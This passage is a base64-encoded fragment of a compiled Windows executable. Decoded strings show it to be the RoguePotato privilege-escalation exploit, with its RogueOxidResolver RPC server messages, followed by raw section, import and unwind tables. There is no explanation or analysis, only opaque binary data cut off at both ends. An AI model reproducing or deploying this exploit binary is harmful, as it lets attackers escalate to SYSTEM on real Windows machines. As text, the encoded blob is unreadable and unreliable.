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AAAAYnUCQAEAAAD4cQJAAQAAABJyAkABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwVxcbq+N0mDGbXb75zMNgEAAAAAAAAA0HcCQAEAAAAAAAAAAAAAAABzAkABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwcQJAAQAAANByAkABAAAAYnUCQAEAAAD4cQJAAQAAAAAAAAAAAAAAqHMCQAEAAAACAAAAAAAAAMBzAkABAAAAAQAAAAMDAAAYAAAAAAAAAEEHAAAIAAAAoHQCQAEAAAAIAAAAAAAAAARyAkABAAAAQAAIARgAAAAoAAAACAAAAAEAAAACAAgAcgAAAAAAAAAEcgJAAQAAAEgBAAAIAAAAB3ICQAEAAADwAAAAEAAAACEAAAAAAAAAsHQCQAEAAAAwAQAABAAAAG1EAEABAAAAbUQAQAEAAABtRABAAQAAAG1EAEABAAAAbUQAQAEAAABtRABAAQAAAAAAAAAAAAAAAAAASAEAAAAAAEAAMgAAACoAaABHBwoHAQABAAAAAABIAQgACwBIABAABgALABgABgATICAAEgASQSgAOgBQITAACABwADgAEAAASAEAAAABABgAMgAAACQACABEAgoBAAAAAAAAAABIAQgACwBwABAAEAAASAEAAAACAEgAMgAAADYARgBGCAoFAAABAAAAAABYAQgACwBIABAABgBIABgABgBIACAABgALACgASgALADAAWgBQITgABgBwAEAAEAAASAEAAAADABAAMgAAAAAACABEAQoBAAAAAAAAAABwAAgAEAAASAEAAAAEAEgAMgAAACoAkABHCAoHAQABAAAAAABIAQgACwBIABAABgALABgABgATICAAEgASQSgAOgBQITAACAASITgAcgBwAEAAEAAASAEAAAAFACgAMgAAAAAATABFBAoDAQAAAAAAAAASIQgAcgATIBAAEgBQIRgACABwACAAEAAAAAAAAABAAG4BQAAAAC4AAABwAAAAAQAAAAcACAByAAAAAAAAAARyAkABAAAASAEAAAgAAAAFcgJAAQAAAMgAAAAQAAAAkHICQAEAAAALAAAAGAAAAGBzAkABAAAAE4AAACAAAAAIcgJAAQAAABKBAAAoAAAABnICQAEAAABQgQAAMAAAAAdyAkABAAAA8AAAADgAAAABAAAAAwMAACAAAAAAAAAAYAAAAMT+/JlgUhsQu8sAqgAhNHoAAAAABF2IiuscyRGf6AgAKxBIYAIAAAAAAAAAeG8CQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgdAJAAQAAAAAAAAYAAAAABgAAAAAAAABwcwJAAQAAAAAAAAAAAAAAIQAAAAAAAADIcQJAAQAAAAEAAAADAwAAAAAAAAAAAAAhAAAAAAAAANhxAkABAAAAAQAAAAMDAAAQAAAAAAAAAPR3/mAAAAAADQAAAAQDAAAEgQIABHMCAAAAAAD0d/5gAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAOAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiwAkABAAAAAAAAAAAAAAAAAAAAAAAAAIjDAUABAAAAmMMBQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJDDAUABAAAAoMMBQAEAAACowwFAAQAAAJDCAkABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABguwIAKHoCAAB6AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAQHoCAAAAAAAAAAAAUHoCAAAAAAAAAAAAAAAAAGC7AgAAAAAAAAAAAP////8AAAAAQAAAACh6AgAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABougIAoHoCAHh6AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAuHoCAAAAAAAAAAAA0HoCAOh+AgAAAAAAAAAAAAAAAAAAAAAAaLoCAAEAAAAAAAAA/////wAAAABAAAAAoHoCAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAJC6AgAgewIA+HoCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAA4ewIAAAAAAAAAAABYewIA0HoCAOh+AgAAAAAAAAAAAAAAAAAAAAAAAAAAAJC6AgACAAAAAAAAAP////8AAAAAQAAAACB7AgAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAC4ugIAqHsCAIB7AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwHsCAAAAAAAAAAAA2HsCAOh+AgAAAAAAAAAAAAAAAAAAAAAAuLoCAAEAAAAAAAAA/////wAAAABAAAAAqHsCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAIB9AgAAAAAAAAAAANB9AgCofQIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAABh8AgAAAAAAAAAAAIC7AgAAAAAACAAAAP////8AAAAAQgAAAAB8AgAAAAAAAAAAAAAAAACguwIAAQAAAAAAAAD/////AAAAAEAAAACQfQIAAAAAAAAAAAAAAAAAEH4CANB9AgDwfAIAWH0CAEh8AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAwLsCAEB9AgDIfAIAAAAAAAAAAAAAAAAAAAAAAIC7AgAAAAAAAAAAAP////8AAAAAQgAAAAB8AgAAAAAAAAAAAAAAAAABAAAACAAAAAAAAADAuwIAQH0CABh9AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAAAFAAAAmHwCAAAAAAAAAAAAoLsCAAEAAAAIAAAA/////wAAAABAAAAAkH0CAAAAAAAAAAAAAAAAAKh9AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAD4fQIAAAAAAAAAAACAuwIAAAAAAAAAAAD/////AAAAAEAAAAAAfAIAAAAAAAAAAAAAAAAA6LsCAAEAAAAAAAAA/////wAAAABAAAAAMHwCAAAAAAAAAAAAAAAAAHB8AgCofQIAAAAAAAAAAAAAAAAAAAAAAMC7AgAEAAAAAAAAAP////8AAAAAQAAAAEB9AgAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAIuwIAsH8CADh+AgAAAAAAAAAAAAAAAAAAAAAAkIACADh/AgDo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